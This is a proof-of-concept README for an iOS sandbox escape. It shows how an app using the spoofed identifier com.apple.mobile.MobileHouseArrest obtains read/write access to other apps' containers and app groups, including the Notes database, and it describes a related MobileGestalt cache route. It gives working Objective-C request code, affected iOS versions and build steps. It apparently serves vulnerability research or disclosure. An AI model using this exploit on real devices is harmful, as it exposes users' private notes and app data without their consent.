# MobileHouseArrest container access PoC

## Overview

MobileContainerManager trusted the caller's CodeDirectory identifier as an
authorization key. A development-signed app could use this identifier:

```text
com.apple.mobile.MobileHouseArrest
```

The app could then request another app's data container or app-group
container. The returned sandbox extension gave read and write access while it
was active.

## Paths accessed

| Request | Path |
| --- | --- |
| Class 2 and an app identifier | `/private/var/mobile/Containers/Data/Application/<UUID>/` |
| Class 7 and an app-group identifier | `/private/var/mobile/Containers/Shared/AppGroup/<UUID>/` |

One notable target is the Notes app group, `group.com.apple.notes`. Its
container includes the user's Notes database and sidecar files:

```text
/private/var/mobile/Containers/Shared/AppGroup/<Notes-group-UUID>/NoteStore.sqlite
/private/var/mobile/Containers/Shared/AppGroup/<Notes-group-UUID>/NoteStore.sqlite-wal
/private/var/mobile/Containers/Shared/AppGroup/<Notes-group-UUID>/NoteStore.sqlite-shm
```

The MobileHouseArrest route therefore exposed sensitive user note data through
the same class-7 container access.

The request selects a container identifier. It does not select an arbitrary
filesystem path.

## Core request

```objc
container_query_t query = query_create();
query_set_class(query, 2);
query_set_flags(query, UINT64_C(0x900000000));
query_set_part(query, 0);

xpc_object_t ids = xpc_array_create(NULL, 0);
xpc_array_set_string(ids, XPC_ARRAY_APPEND,
                     "local.research.SandboxCanaryVictim");
query_set_ids(query, ids);

container_object_t object = query_result(query);
BOOL activated = object != NULL && activate(object, false);
```

After activation, normal file APIs can read and write files inside the selected
container.

## Related MobileGestalt route

A separate class-13 authorization bug gave read and write access to this fixed
directory:

```text
/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/
```

This includes:

```text
/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist
```

That route used class 13, group identifier
`systemgroup.com.apple.mobilegestaltcache`, part 3, and read/write flags.

## Versions

Works on iOS 27 beta 1 through beta 4 and iOS 26. It should also apply to
iOS 18, although some releases may need implementation adjustments.

## Use

1. Add [`poc.m`](poc.m) to an Objective-C iOS application target.
2. Set the bundle identifier to `com.apple.mobile.MobileHouseArrest`.
3. Build with the `iphoneos` SDK for `arm64e`.
4. Call `run_mobilehousearrest_poc()` from a test action.
